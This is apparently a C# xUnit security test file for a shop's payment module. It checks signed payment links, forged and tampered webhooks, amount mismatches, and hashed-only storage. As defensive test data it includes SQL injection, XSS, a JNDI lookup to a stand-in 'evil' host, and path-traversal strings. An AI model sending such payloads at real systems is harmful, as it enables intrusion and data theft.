using System.Text;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.FileProviders;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Options;
using Romp.BuildingBlocks.Web;
using Romp.Modules.Orders.Application.Checkout;
using Romp.Modules.Orders.Application.Payments;
using Romp.Modules.Orders.Domain.Orders;
using Romp.Modules.Orders.Domain.Payments;
using Romp.Modules.Orders.Infrastructure.Orders;
using Romp.Modules.Orders.Infrastructure.Payments;
using Romp.Modules.Orders.Tests.Support;

namespace Romp.Modules.Orders.Tests.Payments;

/// <summary>
/// Security tests for the payment surface: forged, tampered and replayed messages, links used for the wrong order or the wrong purpose,
/// hostile text in every field a gateway message carries, oversized fields, and that nothing but a hash of a message is ever kept
/// (SEC-05, SEC-09, SEC-10, SEC-25, PAY-4, PAY-9, PAY-12).
/// </summary>
public sealed class PaymentSecurityTests(OrdersPostgres postgres) : IClassFixture<OrdersPostgres>
{
    private static readonly DateTimeOffset Now = new(2026, 11, 9, 10, 0, 0, TimeSpan.Zero);
    private const string Key = "a-signing-key-that-is-at-least-32-characters-long";

    private sealed class Env : IHostEnvironment
    {
        public string EnvironmentName { get; set; } = "Production";

        public string ApplicationName { get; set; } = "t";

        public string ContentRootPath { get; set; } = "/";

        public IFileProvider ContentRootFileProvider { get; set; } = new NullFileProvider();
    }

    private static (PaymentLinks Pay, CodLinks Cod) Links(string key = Key)
    {
        var options = Options.Create(new OrdersOptions { LinkSigningKey = key });
        var signer = new OrdersLinkSigner(options, new Env());
        return (new PaymentLinks(options, Options.Create(new SiteOptions { PublicBaseUrl = "https://shop.example" }), signer), new CodLinks(options, signer));
    }

    // ---- the signed payment link --------------------------------------------------------------------------------------------------------

    [Fact]
    [Trait("Spec", "SEC-05")]
    public void APaymentToken_NamesExactlyOneOrder_AndReadsBackIntact()
    {
        var (pay, _) = Links();

        var token = pay.Create("RMP-2026-00001-4", Now);

        Assert.Equal("RMP-2026-00001-4", pay.TryRead(token, Now));
        Assert.DoesNotContain("RMP", token, StringComparison.Ordinal);
    }

    [Fact]
    [Trait("Spec", "SEC-05")]
    public void ATokenForOneOrder_CannotBeEditedToNameAnother()
    {
        var (pay, _) = Links();
        var token = pay.Create("RMP-2026-00001-4", Now);
        var forged = pay.Create("RMP-2026-00002-2", Now);

        // Swap the order part of one token onto the signature of the other, and flip single characters of a good token.
        var mixed = forged.Split('.')[0] + "." + token.Split('.')[1];
        Assert.Null(pay.TryRead(mixed, Now));
        for (var i = 0; i < token.Length; i += 7)
        {
            var chars = token.ToCharArray();
            chars[i] = chars[i] == 'A' ? 'B' : 'A';
            var edited = new string(chars);
            if (edited != token)
            {
                Assert.Null(pay.TryRead(edited, Now));
            }
        }
    }

    [Fact]
    [Trait("Spec", "SEC-05")]
    public void ACashOnDeliveryLink_CannotBeUsedAsAPaymentLink_AndTheOtherWayRound()
    {
        var (pay, cod) = Links();

        Assert.Null(pay.TryRead(cod.Create("RMP-2026-00001-4", Now), Now));
        Assert.Null(cod.TryRead(pay.Create("RMP-2026-00001-4", Now), Now));
    }

    [Fact]
    [Trait("Spec", "SEC-05")]
    public void ATokenMadeWithAnotherSecret_IsNotAccepted()
    {
        var (pay, _) = Links();
        var (attacker, _) = Links("an-attackers-key-that-is-also-32-characters-long!");

        Assert.Null(pay.TryRead(attacker.Create("RMP-2026-00001-4", Now), Now));
    }

    [Fact]
    [Trait("Spec", "SEC-05")]
    public void ATokenStopsWorking_OnceItsTimeIsUp()
    {
        var (pay, _) = Links();
        var token = pay.Create("RMP-2026-00001-4", Now);

        Assert.NotNull(pay.TryRead(token, Now.AddMinutes(30).AddHours(23)));
        Assert.Null(pay.TryRead(token, Now.AddMinutes(30).AddDays(1).AddSeconds(2)));
    }

    [Theory]
    [Trait("Spec", "SEC-05")]
    [InlineData(null)]
    [InlineData("")]
    [InlineData(".")]
    [InlineData("a.b")]
    [InlineData("%00.%00")]
    [InlineData("' OR 1=1 --")]
    [InlineData("<script>alert(1)</script>")]
    public void JunkInPlaceOfAToken_IsRefused_NeverThrows(string? junk)
    {
        var (pay, _) = Links();

        Assert.Null(pay.TryRead(junk, Now));
    }

    [Fact]
    [Trait("Spec", "SEC-05")]
    public void ATokenThatIsAbsurdlyLong_IsRefusedWithoutWork()
    {
        var (pay, _) = Links();

        Assert.Null(pay.TryRead(new string('A', 100_000), Now));
    }

    [Fact]
    [Trait("Spec", "PAY-10")]
    public void TheReturnAddress_StaysOnTheShop_AndCarriesOnlyTheToken()
    {
        var (pay, _) = Links();
        var token = pay.Create("RMP-2026-00001-4", Now);

        var url = pay.ReturnUrl(token);

        Assert.StartsWith("https://shop.example/checkout/payment-return?token=", url, StringComparison.Ordinal);
        Assert.DoesNotContain("RMP-2026", url, StringComparison.Ordinal);
    }

    [Fact]
    public void WithNoSigningKeyOutsideDevelopment_TheSignerRefusesToWork()
    {
        var options = Options.Create(new OrdersOptions { LinkSigningKey = "short" });
        var signer = new OrdersLinkSigner(options, new Env());

        Assert.Throws<InvalidOperationException>(() => signer.Links);
    }

    // ---- hostile text in what the gateway sends ------------------------------------------------------------------------------------------

    [Theory]
    [Trait("Spec", "SEC-10")]
    [InlineData("'; DROP TABLE \"ORDR\".\"PAYM_MAIN\"; --")]
    [InlineData("\" OR \"1\"=\"1")]
    [InlineData("<script>alert('x')</script>")]
    [InlineData("${jndi:ldap://evil/a}")]
    [InlineData("../../etc/passwd")]
    [InlineData("a\u0000b")]
    public async Task HostileTextInASignedMessage_IsStoredAsPlainText_AndHarmsNothing(string hostile)
    {
        using var rig = new PaymentRig(postgres);
        var placed = await rig.PlaceAndStartAsync();
        var eventId = hostile.Length > 90 ? hostile[..90] : hostile;
        var (body, headers) = rig.Gateway.BuildCallback(hostile.Replace("\u0000", string.Empty, StringComparison.Ordinal), GatewayOutcome.Paid, eventId: eventId.Replace("\u0000", string.Empty, StringComparison.Ordinal));

        var result = await rig.Host.SendAsync(new HandlePaymentWebhookCommand("fake", body, headers));

        Assert.Equal(WebhookResultKind.Accepted, result.Kind);
        Assert.Equal(OrderStatuses.PaymentPending, (await rig.OrderAsync(placed.OrderNumber)).StatusId);
        await using var db = postgres.NewContext();
        Assert.True(await db.Payments.AnyAsync(), "the payments table is intact");
        Assert.True(await db.PaymentAttempts.AnyAsync(a => a.GatewayRef == placed.GatewayRef));
    }

    [Fact]
    [Trait("Spec", "SEC-10")]
    public async Task AnOversizedEventIdOrReference_IsRejectedAsMalformed_NotStored()
    {
        using var rig = new PaymentRig(postgres);
        var placed = await rig.PlaceAndStartAsync();
        var (longId, longIdHeaders) = rig.Gateway.BuildCallback(placed.GatewayRef!, GatewayOutcome.Paid, eventId: new string('e', HandlePaymentWebhookCommandHandler.MaxEventIdLength + 1));
        var (longRef, longRefHeaders) = rig.Gateway.BuildCallback(new string('r', PaymentAttempt.MaxReferenceLength + 1), GatewayOutcome.Paid, amount: 3150m);

        var first = await rig.Host.SendAsync(new HandlePaymentWebhookCommand("fake", longId, longIdHeaders));
        var second = await rig.Host.SendAsync(new HandlePaymentWebhookCommand("fake", longRef, longRefHeaders));

        Assert.Equal((WebhookResultKind.Rejected, CallbackRejection.Malformed), (first.Kind, first.Rejection));
        Assert.Equal((WebhookResultKind.Rejected, CallbackRejection.Malformed), (second.Kind, second.Rejection));
        Assert.Equal(OrderStatuses.PaymentPending, (await rig.OrderAsync(placed.OrderNumber)).StatusId);
    }

    [Fact]
    [Trait("Spec", "SEC-10")]
    public async Task AFlipOfAnySingleByteOfASignedBody_IsRejected()
    {
        using var rig = new PaymentRig(postgres);
        var placed = await rig.PlaceAndStartAsync();
        var (body, headers) = rig.Gateway.BuildCallback(placed.GatewayRef!, GatewayOutcome.Paid);

        for (var i = 0; i < body.Length; i += 5)
        {
            var copy = (byte[])body.Clone();
            copy[i] ^= 0x01;

            var result = await rig.Host.SendAsync(new HandlePaymentWebhookCommand("fake", copy, headers));

            Assert.Equal(WebhookResultKind.Rejected, result.Kind);
        }

        Assert.Equal(OrderStatuses.PaymentPending, (await rig.OrderAsync(placed.OrderNumber)).StatusId);
        Assert.Equal(0, await rig.EventCountAsync("OrderPaidEvent", placed.OrderNumber));
    }

    [Fact]
    [Trait("Spec", "SEC-10")]
    public async Task ASignatureLiftedFromAnotherMessage_DoesNotAuthoriseThisOne()
    {
        using var rig = new PaymentRig(postgres);
        var mine = await rig.PlaceAndStartAsync();
        var other = await rig.PlaceAndStartAsync();
        var (_, goodHeaders) = rig.Gateway.BuildCallback(other.GatewayRef!, GatewayOutcome.Failed, amount: 0m, eventId: "evt-other");
        var (forgedBody, _) = rig.Gateway.BuildCallback(mine.GatewayRef!, GatewayOutcome.Paid, eventId: "evt-forged");

        var result = await rig.Host.SendAsync(new HandlePaymentWebhookCommand("fake", forgedBody, goodHeaders));

        Assert.Equal(WebhookResultKind.Rejected, result.Kind);
        Assert.Equal(OrderStatuses.PaymentPending, (await rig.OrderAsync(mine.OrderNumber)).StatusId);
    }

    [Fact]
    [Trait("Spec", "PAY-9")]
    public async Task NothingButAHashOfTheBody_IsEverWrittenToTheDatabase()
    {
        using var rig = new PaymentRig(postgres);
        var placed = await rig.PlaceAndStartAsync();
        const string marker = "4111111111111111-card-number-marker";
        var (body, headers) = rig.Gateway.BuildCallback(placed.GatewayRef!, GatewayOutcome.Paid, eventId: "evt-pci");
        var withMarker = Encoding.UTF8.GetBytes(Encoding.UTF8.GetString(body).TrimEnd('}') + $",\"card\":\"{marker}\"}}");

        // The marker makes the signature invalid; it must not be stored either way, and a correctly signed body is only hashed.
        await rig.Host.SendAsync(new HandlePaymentWebhookCommand("fake", withMarker, headers));
        await rig.Host.SendAsync(new HandlePaymentWebhookCommand("fake", body, headers));

        await using var db = postgres.NewContext();
        var connection = db.Database.GetDbConnection();
        await connection.OpenAsync();
        await using var command = connection.CreateCommand();
        command.CommandText = """
            SELECT count(*) FROM "ORDR"."PAYM_WBHK" w WHERE w::text LIKE '%' || @m || '%'
            """;
        var parameter = command.CreateParameter();
        parameter.ParameterName = "m";
        parameter.Value = marker;
        command.Parameters.Add(parameter);
        Assert.Equal(0L, await command.ExecuteScalarAsync());
    }

    // ---- who may do what -------------------------------------------------------------------------------------------------------------------

    [Fact]
    [Trait("Spec", "SEC-05")]
    public async Task OneShoppersToken_CannotReadOrStartAnotherShoppersPayment()
    {
        using var rig = new PaymentRig(postgres);
        var a = await rig.PlaceAndStartAsync();
        var b = await rig.PlaceAndStartAsync();

        var statusA = await rig.Host.SendAsync(new GetPaymentStatusQuery(a.Token));
        var statusB = await rig.Host.SendAsync(new GetPaymentStatusQuery(b.Token));

        Assert.Equal(a.OrderNumber, statusA!.OrderNumber);
        Assert.Equal(b.OrderNumber, statusB!.OrderNumber);
        Assert.NotEqual(statusA.OrderNumber, statusB.OrderNumber);
        Assert.Equal(StartPaymentKind.InvalidLink, (await rig.Host.SendAsync(new StartOnlinePaymentCommand(a.Token + "x"))).Kind);
    }

    [Fact]
    [Trait("Spec", "SEC-09")]
    public async Task TheAmountSentToTheGateway_IsAlwaysTheServersOrderTotal()
    {
        using var rig = new PaymentRig(postgres);
        rig.Host.Pricing.Priced = FakePricing.Basket(discount: 100m);

        var placed = await rig.PlaceAndStartAsync();

        var session = Assert.Single(rig.Gateway.Sessions);
        Assert.Equal(3050m, session.Amount);
        Assert.Equal((await rig.OrderAsync(placed.OrderNumber)).Total, (await rig.PaymentAsync(placed.OrderNumber)).Amount);
    }

    [Theory]
    [Trait("Spec", "SEC-09")]
    [InlineData(0.01)]
    [InlineData(3149.99)]
    [InlineData(3150.01)]
    [InlineData(31500)]
    public async Task AnyOtherAmountInASignedMessage_NeverConfirmsTheOrder(double amount)
    {
        using var rig = new PaymentRig(postgres);
        var placed = await rig.PlaceAndStartAsync();

        await rig.DeliverAsync(placed.GatewayRef!, GatewayOutcome.Paid, amount: (decimal)amount);

        Assert.Equal(OrderStatuses.PaymentPending, (await rig.OrderAsync(placed.OrderNumber)).StatusId);
        Assert.Equal(PaymentStatuses.InReview, (await rig.PaymentAsync(placed.OrderNumber)).StatusId);
        Assert.Equal(0, await rig.EventCountAsync("OrderPaidEvent", placed.OrderNumber));
    }

    [Fact]
    [Trait("Spec", "SEC-25")]
    public void TheWebhookEventsRaisedForStaff_CarryNoPersonalOrPaymentData()
    {
        var suspect = new Romp.Modules.Orders.Contracts.OrderPaymentSuspectEvent(1, "RMP-2026-00001-4", "AMNT");
        var paid = new Romp.Modules.Orders.Contracts.OrderPaidEvent(1, "RMP-2026-00001-4");

        foreach (var evt in new object[] { suspect, paid })
        {
            var names = evt.GetType().GetProperties().Select(p => p.Name).ToList();
            Assert.DoesNotContain(names, n => n.Contains("Name", StringComparison.Ordinal) && n != "OrderNumber" || n.Contains("Email", StringComparison.Ordinal)
                || n.Contains("Mobile", StringComparison.Ordinal) || n.Contains("Phone", StringComparison.Ordinal) || n.Contains("Card", StringComparison.Ordinal)
                || n.Contains("Address", StringComparison.Ordinal) || n.Contains("Amount", StringComparison.Ordinal));
        }
    }
}
